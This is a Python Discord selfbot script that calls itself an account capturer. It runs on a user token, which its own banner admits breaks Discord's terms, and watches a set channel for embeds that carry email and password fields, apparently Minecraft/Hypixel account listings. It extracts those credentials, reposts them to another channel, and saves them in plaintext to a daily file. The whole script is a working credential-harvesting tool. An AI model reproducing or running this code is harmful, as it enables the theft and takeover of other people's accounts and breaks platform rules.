import os
import re
import asyncio
from typing import Dict, Optional
import datetime
from dotenv import load_dotenv
import discord
from discord.ext import commands

# Load environment variables
load_dotenv()

# Configuration
TOKEN = os.getenv('DISCORD_TOKEN')
MONITOR_CHANNEL_ID = int(os.getenv('MONITOR_CHANNEL_ID', '1470409209123176642'))
FORWARD_CHANNEL_ID = int(os.getenv('FORWARD_CHANNEL_ID', '1483459286569849066'))

class AccountParser:
    """Parse account embeds"""
    
    @staticmethod
    def parse_hypixel_embed(embed: discord.Embed) -> Dict:
        """Parse Hypixel/FlareCloud account embeds"""
        result = {
            'type': 'hypixel_account',
            'email': None,
            'password': None,
            'status': None,
            'playtime': None,
            'money': None,
            'shards': None,
            'minecraft_type': None
        }
        
        # Parse fields
        for field in embed.fields:
            name = field.name.lower()
            value = field.value
            
            if 'email' in name:
                email_match = re.search(r'[\w\.-]+@[\w\.-]+\.\w+', value)
                result['email'] = email_match.group() if email_match else value.strip()
            
            elif 'password' in name or 'pass' in name:
                result['password'] = value.strip()
            
            elif 'status' in name or 'hybrid' in name:
                result['status'] = value.strip()
            
            elif 'playtime' in name or 'donut' in name:
                result['playtime'] = value.strip()
            
            elif 'money' in name:
                result['money'] = value.strip()
            
            elif 'shards' in name:
                result['shards'] = value.strip()
            
            elif 'type' in name:
                result['minecraft_type'] = value.strip()
        
        return result
    
    @staticmethod
    def parse_generic_embed(embed: discord.Embed) -> Dict:
        """Parse any embed with email/password"""
        result = {
            'type': 'generic_account',
            'email': None,
            'password': None,
            'extra': {}
        }
        
        for field in embed.fields:
            name = field.name.lower()
            value = field.value
            
            if 'email' in name:
                email_match = re.search(r'[\w\.-]+@[\w\.-]+\.\w+', value)
                result['email'] = email_match.group() if email_match else value.strip()
            
            elif 'password' in name or 'pass' in name:
                result['password'] = value.strip()
            
            else:
                result['extra'][field.name] = value
        
        return result

class SelfBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.messages = True
        
        super().__init__(
            command_prefix='!',
            self_bot=True,  # This enables selfbot mode
            intents=intents,
            help_command=None
        )
        self.parser = AccountParser()
        self.captured_accounts = []
        self.monitor_channel_id = MONITOR_CHANNEL_ID
        self.forward_channel_id = FORWARD_CHANNEL_ID
    
    async def on_ready(self):
        print(f'\n{"="*60}')
        print(f'✓ SELFBOT ONLINE: {self.user.name}')
        print(f'✓ User ID: {self.user.id}')
        print(f'✓ Monitoring Channel: {self.monitor_channel_id}')
        print(f'✓ Forwarding to: {self.forward_channel_id}')
        print(f'{"="*60}\n')
        
        # Test connection to channels
        try:
            monitor_channel = self.get_channel(self.monitor_channel_id)
            if monitor_channel:
                print(f'✓ Connected to monitoring channel: #{monitor_channel.name}')
            else:
                print(f'⚠️ Monitoring channel not found, but will still monitor by ID')
        except Exception as e:
            print(f'⚠️ Could not verify monitoring channel: {e}')
        
        try:
            forward_channel = self.get_channel(self.forward_channel_id)
            if forward_channel:
                print(f'✓ Connected to forwarding channel: #{forward_channel.name}')
            else:
                print(f'⚠️ Forwarding channel not found, but will still forward by ID')
        except Exception as e:
            print(f'⚠️ Could not verify forwarding channel: {e}')
        
        print(f'\n🚀 Selfbot is running! Waiting for accounts...\n')
    
    async def on_message(self, message: discord.Message):
        # Skip own messages
        if message.author.id == self.user.id:
            return
        
        # Only monitor specific channel
        if message.channel.id != self.monitor_channel_id:
            return
        
        # Check for embeds
        if message.embeds:
            for embed in message.embeds:
                await self.process_embed(message, embed)
        
        await self.process_commands(message)
    
    async def process_embed(self, message: discord.Message, embed: discord.Embed):
        """Process embed and forward if account found"""
        
        account_data = None
        
        # Check embed type
        title_lower = embed.title.lower() if embed.title else ""
        
        if 'flarecloud' in title_lower or 'hypixel' in title_lower or 'unban' in title_lower:
            account_data = self.parser.parse_hypixel_embed(embed)
        elif any('email' in field.name.lower() for field in embed.fields):
            account_data = self.parser.parse_generic_embed(embed)
        
        # Validate we got an account
        if account_data and account_data.get('email') and account_data.get('password'):
            await self.capture_account(message, embed, account_data)
    
    async def capture_account(self, message: discord.Message, embed: discord.Embed, account_data: Dict):
        """Capture and forward account instantly"""
        
        # Store account
        self.captured_accounts.append({
            'timestamp': datetime.datetime.now().isoformat(),
            'source_channel': message.channel.id,
            'author': str(message.author),
            'account': account_data
        })
        
        # Console log
        print(f'\n{"🔐"*35}')
        print(f'🎯 ACCOUNT CAPTURED!')
        print(f'{"🔐"*35}')
        print(f'⏰ Time: {datetime.datetime.now().strftime("%H:%M:%S")}')
        print(f'📌 Channel: #{message.channel.name}')
        print(f'👤 Author: {message.author.name}')
        print(f'📧 Email: {account_data["email"]}')
        print(f'🔑 Password: {account_data["password"]}')
        
        if account_data.get('status'):
            print(f'📊 Status: {account_data["status"]}')
        if account_data.get('playtime'):
            print(f'⏱️ Playtime: {account_data["playtime"]}')
        if account_data.get('money'):
            print(f'💰 Money: {account_data["money"]}')
        if account_data.get('shards'):
            print(f'💎 Shards: {account_data["shards"]}')
        
        # Forward to target channel
        await self.forward_account(account_data, message)
        
        # Save to file
        self.save_to_file(account_data, message)
        
        print(f'✅ Forwarded to channel {self.forward_channel_id}')
        print(f'{"🔐"*35}\n')
    
    async def forward_account(self, account_data: Dict, original_message: discord.Message):
        """Forward account to target channel instantly"""
        
        try:
            forward_channel = self.get_channel(self.forward_channel_id)
            if not forward_channel:
                print(f"❌ Cannot find forwarding channel ID: {self.forward_channel_id}")
                return
            
            # Create embed for forwarding
            embed = discord.Embed(
                title="🎯 NEW ACCOUNT CAPTURED!",
                color=0xff0000,
                timestamp=datetime.datetime.now()
            )
            
            embed.add_field(
                name="📧 Email",
                value=f"||{account_data['email']}||",
                inline=False
            )
            embed.add_field(
                name="🔑 Password",
                value=f"||{account_data['password']}||",
                inline=False
            )
            
            embed.add_field(
                name="📌 Source",
                value=f"Channel: <#{self.monitor_channel_id}>\nAuthor: {original_message.author.name}",
                inline=False
            )
            
            if account_data.get('status'):
                embed.add_field(name="📊 Status", value=account_data['status'], inline=True)
            if account_data.get('playtime'):
                embed.add_field(name="⏱️ Playtime", value=account_data['playtime'], inline=True)
            if account_data.get('money'):
                embed.add_field(name="💰 Money", value=account_data['money'], inline=True)
            if account_data.get('shards'):
                embed.add_field(name="💎 Shards", value=account_data['shards'], inline=True)
            if account_data.get('minecraft_type'):
                embed.add_field(name="🎮 Type", value=account_data['minecraft_type'], inline=True)
            
            embed.set_footer(text=f"Captured at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Send to forward channel
            await forward_channel.send(embed=embed)
            
        except Exception as e:
            print(f"❌ Failed to forward: {e}")
    
    def save_to_file(self, account_data: Dict, message: discord.Message):
        """Save account to file"""
        filename = f"accounts_{datetime.datetime.now().strftime('%Y%m%d')}.txt"
        
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Time: {datetime.datetime.now().isoformat()}\n")
            f.write(f"Channel: #{message.channel.name} (ID: {message.channel.id})\n")
            f.write(f"Author: {message.author.name}\n")
            f.write(f"Email: {account_data['email']}\n")
            f.write(f"Password: {account_data['password']}\n")
            if account_data.get('status'):
                f.write(f"Status: {account_data['status']}\n")
            if account_data.get('playtime'):
                f.write(f"Playtime: {account_data['playtime']}\n")
            if account_data.get('money'):
                f.write(f"Money: {account_data['money']}\n")
            if account_data.get('shards'):
                f.write(f"Shards: {account_data['shards']}\n")
            f.write(f"{'='*60}\n")

def main():
    if not TOKEN:
        print("\n❌ ERROR: DISCORD_TOKEN not found in .env file!")
        print("Create a .env file with:")
        print('DISCORD_TOKEN=your_token_here')
        print('MONITOR_CHANNEL_ID=1470409209123176642')
        print('FORWARD_CHANNEL_ID=1483459286569849066')
        return
    
    print("\n" + "="*60)
    print("⚠️  DISCORD SELFBOT - ACCOUNT CAPTURER")
    print("="*60)
    print(f"📡 Monitoring Channel: {MONITOR_CHANNEL_ID}")
    print(f"📤 Forwarding to: {FORWARD_CHANNEL_ID}")
    print("="*60)
    print("⚠️  WARNING: This violates Discord ToS!")
    print("⚠️  Your account may be banned!")
    print("="*60)
    
   
   
    bot = SelfBot()
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"❌ Error: {e}")
    

if __name__ == "__main__":
    main()
